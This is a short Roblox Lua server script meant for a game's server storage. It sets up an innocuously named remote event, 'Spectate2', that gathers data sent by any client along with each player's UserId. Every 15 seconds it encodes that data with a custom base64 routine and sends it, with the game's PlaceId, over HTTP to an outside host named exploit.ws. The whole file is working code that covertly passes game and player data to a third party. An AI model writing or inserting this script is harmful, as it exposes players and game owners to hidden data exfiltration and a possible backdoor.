-- O46EQaiuM2PoyJ Dec 4 2019
-- Put this in game.ServerScriptStorage

local remote = Instance.new('RemoteEvent',game:GetService('ReplicatedStorage')); remote.Name = 'Spectate2';
local HttpService = game:GetService('HttpService');
local apiUrl = 'http://11.exploit.ws/console_logging/api.php?pid='..game.PlaceId;

local function base64encode(data)
	local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._';
    return ((data:gsub('.', function(x) 
        local r,b = '', x:byte();
        for i=8,1,-1 do r=r..(b%2^i-b%2^(i-1)>0 and '1' or '0'); end;
        return r;
    end)..'0000'):gsub('%d%d%d?%d?%d?%d?', function(x)
        if (#x < 6) then return ''; end;
        local c = 0;
        for i=1,6 do c=c+(x:sub(i,i)=='1' and 2^(6-i) or 0); end;
        return b:sub(c+1,c+1);
    end)..({ '', '--', '-' })[#data%3+1]);
end;

function base64decode(data)
	local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._';
    data = string.gsub(data, '[^'..b..'-]', '');
    return (data:gsub('.', function(x)
        if (x == '-') then return ''; end;
        local r,f = '', (b:find(x)-1);
        for i=6,1,-1 do r = r..(f%2^i-f%2^(i-1)>0 and '1' or '0'); end;
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return ''; end;
        local c = 0;
        for i=1,8 do c = c+(x:sub(i,i)=='1' and 2^(8-i) or 0); end;
        return string.char(c);
    end));
end;

local queue = '';

remote.OnServerEvent:Connect(function(p,data)
	queue = queue..'>|'..p.UserId..'>>'..base64decode(data);
end);

while(wait(15)) do
	local response = '';
	if(queue~='' and queue~=' ') then
		queue = string.gsub(queue, "\n", "");
		--warn(queue);
		response = HttpService:GetAsync(apiUrl..'&data='..base64encode(queue));
		queue = '';
		--warn('Response: '..response);
	end;
end;
